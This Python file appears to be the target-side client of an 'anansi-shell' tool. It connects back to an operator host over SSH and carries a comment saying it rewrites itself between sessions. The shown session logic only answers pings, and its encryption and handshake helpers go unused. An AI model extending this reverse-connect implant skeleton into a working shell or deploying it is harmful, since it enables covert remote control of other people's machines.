"""Target, connects back to the operator over SSH."""

import argparse
import base64
import os
import struct

import paramiko
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

# this file rewrites itself between sessions, so the operator side must never import code.
# frame mirrored from server.py
PROTO_VERSION = 1
AEAD = {1: AESGCM, 2: ChaCha20Poly1305}
MAX_FRAME = 2 << 20


def seal_frame(key, algo, plaintext):
    """Encrypt into header + nonce + ciphertext"""
    nonce = os.urandom(12)
    header = bytes((PROTO_VERSION, algo))
    ciphertext = AEAD[algo](key).encrypt(nonce, base64.b64encode(plaintext), header)
    return header + nonce + ciphertext


def unseal_frame(key, body):
    """Decrypt frame body"""
    version, algo = body[0], body[1]
    if len(body) < 30 or version != PROTO_VERSION or algo not in AEAD:
        raise ValueError(f"unsupported frame header: version={version} algo={algo}")
    payload = AEAD[algo](key).decrypt(body[2:14], body[14:], body[:2])
    return base64.b64decode(payload, validate=True)


def read_exactly(channel, count):
    data = b""
    while len(data) < count:
        chunk = channel.recv(count - len(data))
        if not chunk:
            raise EOFError("channel closed mid-frame")
        data += chunk
    return data


def send_frame(channel, key, algo, plaintext):
    body = seal_frame(key, algo, plaintext)
    channel.sendall(struct.pack(">I", len(body)) + body)


def recv_frame(channel):
    (length,) = struct.unpack(">I", read_exactly(channel, 4))
    if length > MAX_FRAME:
        raise ValueError(f"frame exceeds {MAX_FRAME} bytes: {length}")
    return read_exactly(channel, length)


def send_raw(channel, blob):
    # public handshake (unencrypted)
    channel.sendall(struct.pack(">I", len(blob)) + blob)


def handshake(channel):
    """X25519 exchange to obtain session key"""
    private = X25519PrivateKey.generate()
    salt = os.urandom(16)
    send_raw(channel, private.public_key().public_bytes_raw() + salt)
    peer = X25519PublicKey.from_public_bytes(recv_frame(channel))
    return derive_key(private.exchange(peer), salt)


def derive_key(shared, salt):
    # shared secret in; session key out.
    return HKDF(hashes.SHA256(), 32, salt, b"anansi-shell v1").derive(shared)


def connect(host, port, password, fingerprint=None):
    """Open session channel for later functionality."""
    transport = paramiko.Transport((host, port))
    transport.start_client()
    server_key = transport.get_remote_server_key()
    if fingerprint and server_key.fingerprint != fingerprint:
        transport.close()
        raise SystemExit(f"host key mismatch: saw {server_key.fingerprint}")
    try:
        transport.auth_password("shell", password)
    except paramiko.AuthenticationException:
        transport.close()
        raise SystemExit("authentication failed")
    return transport, transport.open_session()


def session(channel, verbose):
    """pong until the channel closes."""
    while True:
        data = channel.recv(4096)
        if not data:
            return
        if data == b"ping":
            channel.send(b"pong")
        elif verbose:
            print(f"received: {data.decode(errors='replace')!r}", flush=True)


def main():
    parser = argparse.ArgumentParser(description="anansi-shell client")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument("--password", required=True)
    parser.add_argument("--fingerprint", help="expected host key SHA256 fingerprint")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()
    transport, channel = connect(args.host, args.port, args.password, args.fingerprint)
    session(channel, args.verbose)
    channel.close()
    transport.close()


if __name__ == "__main__":
    main()
